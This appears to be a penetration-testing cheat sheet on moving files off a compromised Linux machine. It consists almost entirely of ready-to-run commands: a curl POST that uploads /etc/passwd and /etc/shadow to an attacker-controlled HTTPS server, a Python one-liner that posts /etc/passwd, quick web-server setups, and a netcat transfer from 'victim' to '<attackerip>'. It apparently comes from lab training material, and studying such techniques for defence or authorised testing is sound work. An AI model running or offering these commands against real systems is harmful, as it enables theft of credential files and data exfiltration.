# Upload Operations
## Start Web Server
```
sudo python3 -m pip install --user uploadserver
```
## Create a Self-Signed Certificate
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server’
```
## Start Web Server
```
mkdir https && cd https
```
```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
## Linux - Upload Multiple Files
```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
We used the option --insecure because we used a self-signed certificate that we trust.
## Alternative Web File Transfer Method
if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page,
### Linux - Creating a Web Server with Python3
```
python3 -m http.server
```
### Linux - Creating a Web Server with Python2.7
```
python2.7 -m SimpleHTTPServer
```
### Linux - Creating a Web Server with PHP
```
php -S 0.0.0.0:8000
```
### Linux - Creating a Web Server with Ruby
```
ruby -run -ehttpd . -p8000
```
### Download the File from the Target Machine onto the Pwnbox
```
wget TargetIP:8000/filetotransfer.txt
```
## Upload Operations using Python3
### Starting the Python uploadserver Module
```
python3 -m uploadserver 
```
### Uploading a File Using a Python One-liner
```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
## Netcat
### Victim machine
```
nc <attackerip> 9001 < <filetotransfer>
```
### Attacker's machine
```
nc -lvnp 9001 > <nameoftransferredfile>
```